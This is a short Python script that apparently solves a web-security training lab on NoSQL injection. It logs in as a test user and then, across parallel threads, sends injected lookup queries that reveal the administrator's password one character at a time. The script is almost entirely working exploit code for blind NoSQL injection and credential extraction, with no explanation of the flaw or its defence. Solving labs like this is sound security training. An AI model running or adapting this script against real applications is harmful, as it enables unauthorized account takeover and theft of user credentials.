# LAB: Exploiting NoSQL injection to extract data
import requests
from threading import Thread
import string
import re
import urllib.parse
import time

start_time = time.time()

# URL LAB ID
url = 'https://0aec00e604a220958191039f008d0015.web-security-academy.net'

password = [''] * 8
threads = []

session = requests.Session()

# Login into wiener account
csrf = re.findall(r'name="csrf".*?value="(.*?)">', session.get(url + '/login').text)[0]
session.post(url + '/login', data={"username": "wiener","password": "peter", "csrf" : csrf})

def find_password(i):
  for char in string.ascii_lowercase:
      user_param = urllib.parse.quote(f"administrator' && this.password[{i}]=='{char}")
      response = session.get(url + f"/user/lookup?user={user_param}")
      if "administrator" in response.text:
        password[i] = char
        break


for i in range(8):
  threads.append(Thread(target=find_password, args=(i,)))
  threads[i].start()
  
for i in range(8):
  threads[i].join()
  
print(f'administrator password: {"".join(password)}')
print('------------------------------------------- \nExecution Time: %s seconds' % (time.time() - start_time))